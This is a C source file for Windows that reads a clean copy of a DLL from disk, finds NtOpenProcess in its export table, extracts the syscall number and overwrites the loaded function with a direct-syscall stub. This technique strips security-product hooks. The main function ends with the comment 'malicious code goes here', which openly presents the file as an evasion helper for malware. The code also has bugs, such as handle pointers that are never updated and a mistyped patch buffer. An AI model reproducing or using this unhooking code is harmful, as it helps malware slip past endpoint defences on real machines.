#include <Windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

VOID *GetFileFromDisk(CHAR *name, HANDLE *hFile, HANDLE *hMap);
VOID PatchHook(CHAR* address, unsigned char id, char high);
VOID PatchAPI(VOID *lib, CHAR *name, HANDLE hDll);

VOID *GetFileFromDisk(CHAR *name, HANDLE *hFile, HANDLE *hMap) {
        VOID *data = NULL;
        HANDLE localHFile = *hFile;
        HANDLE localHMap = *hMap;
        localHFile = CreateFile(name, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        localHMap = CreateFileMapping(localHFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
        data = MapViewOfFile(localHMap, FILE_MAP_READ, 0, 0, 0);

        hFile = &localHFile;
        hMap = &localHMap;

        return data;
}

VOID PatchAPI(VOID *lib, CHAR *name, HANDLE hDll) {
    DWORD dwIter = 0;
    CHAR* base = lib;
    CHAR* PE = base + (unsigned char)*(base + 0x3c);
    DWORD ExportDirectoryOffset = *((DWORD*)PE + (0x8a / 4));
    CHAR* ExportDirectory = base + ExportDirectoryOffset;
    DWORD dwFunctionsCount = *((DWORD*)ExportDirectory + (0x14 / 4));
    DWORD OffsetNamesTableOffset = *((DWORD*)ExportDirectory + (0x20 / 4));
    DWORD* OffsetNamesTable = base + OffsetNamesTableOffset;
    DWORD OffsetOrdinals = *((DWORD*)ExportDirectory + (0x24 / 4));
    WORD* ordinals = base + OffsetOrdinals;
    DWORD OffsetFunctions = *((DWORD*)ExportDirectory + (0x1c / 4));
    DWORD* functions = base + OffsetFunctions;

    printf("------------------------------------------\nBASE\t\t\t0x%p\t%s\nPE\t\t\t0x%p\t%s\nExportTableOffset\t0x%p\nOffsetNameTable\t\t0x%p\nOrdinalTable\t\t0x%p\nFunctionTable\t\t0x%p\nFunctions Count\t\t0x%x (%d)\n------------------------------------------\n",
    base, base, PE, PE, ExportDirectory, OffsetNamesTable, ordinals, functions, dwFunctionsCount, dwFunctionsCount);

    for(dwIter; dwIter < dwFunctionsCount - 1; dwIter++) {
        DWORD64 offset = *(OffsetNamesTable + dwIter);
        CHAR* current = base + offset;
        if(strcmp(current, name) == 0) {
            WORD offsetInOrdinal = *(ordinals + dwIter);
            DWORD function = *(functions + offsetInOrdinal);
            CHAR *func = base + function + 4;
            DWORD *data = (DWORD*)func;
            DWORD syscallID = *data;
            CHAR id = syscallID;
            CHAR high = syscallID >> 8;
            FARPROC toPatchAddr = GetProcAddress(hDll, name);

            PatchHook(toPatchAddr, id, high);
            break;
        }
    }
}

VOID PatchHook(CHAR* address, unsigned char id, char high) {
    DWORD dwSize = 11;
    CHAR* patch_address = address;
    //\x4c\x8b\xd1\xb8\xXX\xHH\x00\x00\x0f\x05\xc3
    CHAR* patch[dwSize];
    sprintf(patch, "\x4c\x8b\xd1\xb8%c%c%c%c\x0f\x05\xc3", id, high, high ^ high, high ^ high);

    DWORD dwOld;
    VirtualProtect(patch_address, dwSize, PAGE_EXECUTE_READWRITE, &dwOld);
    memcpy(patch_address, patch, dwSize);
}

int main (int argc, char **argv) {
    CHAR *dll = argv[1];
    HANDLE hFile = NULL;
    HANDLE hMap = NULL;
    printf("Opening %s\n", dll);

    HANDLE hDll = LoadLibrary(dll);

    VOID *data = GetFileFromDisk(dll, &hFile, &hMap);
    PatchAPI(data, "NtOpenProcess", hDll);

    CloseHandle(hFile);
    CloseHandle(hMap);

    // malicious code goes here

    return 0;
}
